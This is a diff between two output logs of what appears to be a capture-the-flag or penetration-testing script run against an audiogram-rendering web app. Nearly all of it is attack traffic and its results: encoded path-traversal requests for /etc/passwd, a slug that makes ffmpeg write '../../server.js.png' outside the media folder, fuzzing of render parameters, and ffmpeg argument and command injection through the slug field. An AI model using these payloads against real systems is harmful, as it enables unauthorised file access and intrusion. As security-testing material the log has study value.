@@ -1,75 +1,72 @@
-render: {'ok': True, 'outputs': [{'file': 'audiogram.png', 'url': '/m/0da02de760fc46ed/audiogram.png'}], 'errors': None}
-poster url: /m/0da02de760fc46ed/audiogram.png ws: 0da02de760fc46ed
-GET poster: 200 image/png len 8545
+########## FULL STDERR on normal render ##########
+200 {"ok": true, "outputs": [{"file": "audiogram.png", "url": "/m/04e25d09fc067b46/audiogram.png"}], "errors": null}
 
-########## SERVE-ROUTE TRAVERSAL (LFI) ##########
-[/m/0da02de760fc46ed/../../../../etc/passwd] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
-[/m/0da02de760fc46ed/..%2f..%2f..%2f..%2fetc%2fpasswd] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
-[/m/0da02de760fc46ed/..%2F..%2F..%2F..%2Fetc%2Fpasswd] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
-[/m/0da02de760fc46ed/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
-[/m/0da02de760fc46ed/..%252f..%252f..%252fetc%252fpasswd] 404 ct=text/html; charset=utf-8 len=3274 bin b'<!doctype html>\n<html lang="en">\n<head>\n'
-[/m/0da02de760fc46ed/....//....//....//....//etc/passwd] 404 ct=text/html; charset=utf-8 len=3274 bin b'<!doctype html>\n<html lang="en">\n<head>\n'
-[/m/0da02de760fc46ed%2f..%2f..%2f..%2fetc%2fpasswd] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
-[/m/../etc/passwd] 404 ct=text/html; charset=utf-8 len=3274 bin b'<!doctype html>\n<html lang="en">\n<head>\n'
-[/m/..%2f..%2f..%2fetc%2fpasswd] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
-[/m/0da02de760fc46ed/../../../../etc/passwd%00.png] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
-[/m/0da02de760fc46ed/..\..\..\..\etc\passwd] 404 ct=text/html; charset=utf-8 len=3274 bin b'<!doctype html>\n<html lang="en">\n<head>\n'
+--- traversal ../../server.js FULL errors ---
+{
+ "ok": false,
+ "outputs": [],
+ "errors": "ffmpeg exited with code 0\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libsvtav1 --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --enable-opengl --enable-sdl2 --disable-sndio --enable-libjxl --enable-pocketsphinx --enable-librsvg --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-libplacebo --enable-librav1e --enable-shared\n  libavutil      57. 28.100 / 57. 28.100\n  libavcodec     59. 37.100 / 59. 37.100\n  libavformat    59. 27.100 / 59. 27.100\n  libavdevice    59.  7.100 / 59.  7.100\n  libavfilter     8. 44.100 /  8. 44.100\n  libswscale      6.  7.100 /  6.  7.100\n  libswresample   4.  7.100 /  4.  7.100\n  libpostproc    56.  6.100 / 56.  6.100\nGuessed Channel Layout for Input Stream #0.0 : mono\nInput #0, wav, from '/opt/app/media/04e25d09fc067b46/source.wav':\n  Duration: 00:00:01.00, bitrate: 128 kb/s\n  Stream #0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 8000 Hz, mono, s16, 128 kb/s\nInput #1, lavfi, from 'color=c=0x14181c:s=1200x675':\n  Duration: N/A, start: 0.000000, bitrate: N/A\n  Stream #1:0: Video: rawvideo (I420 / 0x30323449), yuv420p, 1200x674 [SAR 1:1 DAR 600:337], 25 tbr, 25 tbn\nStream mapping:\n  Stream #0:0 (pcm_s16le) -> showwavespic:default\n  Stream #1:0 (rawvideo) -> overlay\n  drawtext:default -> Stream #0:0 (png)\nPress [q] to stop, [?] for help\nOutput #0, image2, to '../../server.js.png':\n  Metadata:\n    encoder         : Lavf59.27.100\n  Stream #0:0: Video: png, rgb24(pc, gbr/unknown/unknown, progressive), 1200x674 [SAR 1:1 DAR 600:337], q=2-31, 200 kb/s, 25 fps, 25 tbn\n    Metadata:\n      encoder         : Lavc59.37.100 png\n[image2 @ 0x64e9d0100ec0] The specified filename '../../server.js.png' does not contain an image sequence pattern or a pattern is invalid.\n[image2 @ 0x64e9d0100ec0] Use a pattern such as %03d for an image sequence or use the -update option (with -frames:v 1 if needed) to write a single image.\nframe=    1 fps=0.0 q=-0.0 size=N/A time=00:00:00.04 bitrate=N/A speed=0.137x    \rframe=    1 fps=0.0 q=-0.0 Lsize=N/A time=00:00:00.04 bitrate=N/A speed=0.0996x    \nvideo:8kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: unknown"
+}
 
-########## try reading app source & flag via serve route ##########
+########## render PARAM FUZZ ##########
 
-########## full studio inline JS ##########
-<script>
-  (function () {
-    var form = document.getElementById('renderForm');
-    if (!form) return;
-    var btn = document.getElementById('renderBtn');
-    var status = document.getElementById('renderStatus');
-    var grid = document.getElementById('posterGrid');
-    var empty = document.getElementById('postersEmpty');
+>> {"slug": "x", "theme": "midnight", "format": "txt"} -> 200
+{"ok": true, "outputs": [{"file": "x.png", "url": "/m/04e25d09fc067b46/x.png"}], "errors": null}
 
-    function addPoster(o) {
-      if (grid.querySelector('[data-file="' + (window.CSS && CSS.escape ? CSS.escape(o.file) : o.file) + '"]')) return;
-      var a = document.createElement('a');
-      a.className = 'poster';
-      a.setAttribute('data-file', o.file);
-      a.href = o.url; a.target = '_blank'; a.rel = 'noopener';
-      var img = document.createElement('img');
-      img.src = o.url; img.alt = 'Audiogram ' + o.file;
-      var name = document.createElement('span');
-      name.className = 'poster-name mono'; name.textContent = o.file;
-      a.appendChild(img); a.appendChild(name);
-      grid.insertBefore(a, grid.firstChild);
-    }
+>> {"slug": "x", "theme": "midnight", "formats": ["png", "mp3"]} -> 200
+{"ok": true, "outputs": [{"file": "x.png", "url": "/m/04e25d09fc067b46/x.png"}], "errors": null}
 
-    form.addEventListener('submit', function (e) {
-      e.preventDefault();
-      btn.disabled = true;
-      status.textContent = 'Rendering...';
-      fetch('/api/render', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          slug: document.getElementById('slugInput').value,
-          theme: document.getElementById('themeSelect').value
-        })
-      })
-        .then(function (r) { return r.json(); })
-        .then(function (data) {
-          // Note: the API also returns an `errors` field on failure. The Studio
-          // does not surface it here.
-          var outs = (data && data.outputs) || [];
-          if (outs.length) {
-            empty.hidden = true; grid.hidden = false;
-            outs.forEach(addPoster);
-            status.textContent = 'Rendered.';
-          } else {
-            status.textContent = 'Nothing to render.';
-          }
-        })
-        .catch(function () { status.textContent = 'Nothing to render.'; })
-        .then(function () { btn.disabled = false; });
-    });
-  })();
-</script>
+>> {"slug": "x", "theme": "midnight", "ext": "mp3"} -> 200
+{"ok": true, "outputs": [{"file": "x.png", "url": "/m/04e25d09fc067b46/x.png"}], "errors": null}
+
+>> {"slug": "x", "theme": "midnight", "input": "/etc/passwd"} -> 200
+{"ok": true, "outputs": [{"file": "x.png", "url": "/m/04e25d09fc067b46/x.png"}], "errors": null}
+
+>> {"slug": "x", "theme": "midnight", "source": "/etc/passwd"} -> 200
+{"ok": true, "outputs": [{"file": "x.png", "url": "/m/04e25d09fc067b46/x.png"}], "errors": null}
+
+>> {"slug": "x", "theme": "midnight", "clip": "/etc/passwd"} -> 200
+{"ok": true, "outputs": [{"file": "x.png", "url": "/m/04e25d09fc067b46/x.png"}], "errors": null}
+
+>> {"slug": "x", "theme": "../../../../etc/passwd"} -> 200
+{"ok": true, "outputs": [{"file": "x.png", "url": "/m/04e25d09fc067b46/x.png"}], "errors": null}
+
+>> {"slug": "x", "theme": "midnight", "width": 99999} -> 200
+{"ok": true, "outputs": [{"file": "x.png", "url": "/m/04e25d09fc067b46/x.png"}], "errors": null}
+
+>> {"slug": "x", "theme": "midnight", "args": ["-i", "/etc/passwd"]} -> 200
+{"ok": true, "outputs": [{"file": "x.png", "url": "/m/04e25d09fc067b46/x.png"}], "errors": null}
+
+>> {"slug": "x"} -> 200
+{"ok": true, "outputs": [{"file": "x.png", "url": "/m/04e25d09fc067b46/x.png"}], "errors": null}
+
+>> {"theme": "midnight"} -> 200
+{"ok": true, "outputs": [{"file": "audiogram.png", "url": "/m/04e25d09fc067b46/audiogram.png"}], "errors": null}
+
+>> {} -> 200
+{"ok": true, "outputs": [{"file": "audiogram.png", "url": "/m/04e25d09fc067b46/audiogram.png"}], "errors": null}
+
+########## ffmpeg argument injection via slug (output arg) ##########
+
+>> slug='audiogram' -> 200
+{"ok": true, "outputs": [{"file": "audiogram.png", "url": "/m/04e25d09fc067b46/audiogram.png"}], "errors": null}
+
+>> slug='audiogram.png -i /etc/passwd' -> 200
+{"ok": false, "outputs": [], "errors": "ffmpeg exited with code 1\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-
+
+>> slug='concat:/etc/passwd' -> 200
+{"ok": false, "outputs": [], "errors": "ffmpeg exited with code 1\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-
+
+>> slug='/etc/passwd' -> 200
+{"ok": false, "outputs": [], "errors": "ffmpeg exited with code 1\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-
+
+>> slug='audiogram|id' -> 200
+{"ok": true, "outputs": [{"file": "audiogram|id.png", "url": "/m/04e25d09fc067b46/audiogram|id.png"}], "errors": null}
+
+>> slug='audiogram.mp3' -> 200
+{"ok": true, "outputs": [{"file": "audiogram.mp3.png", "url": "/m/04e25d09fc067b46/audiogram.mp3.png"}], "errors": null}
+
+>> slug='a.png -frames 1 /tmp/x.png -y /etc/passwd' -> 200
+{"ok": false, "outputs": [], "errors": "ffmpeg exited with code 1\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-
 
 DONE
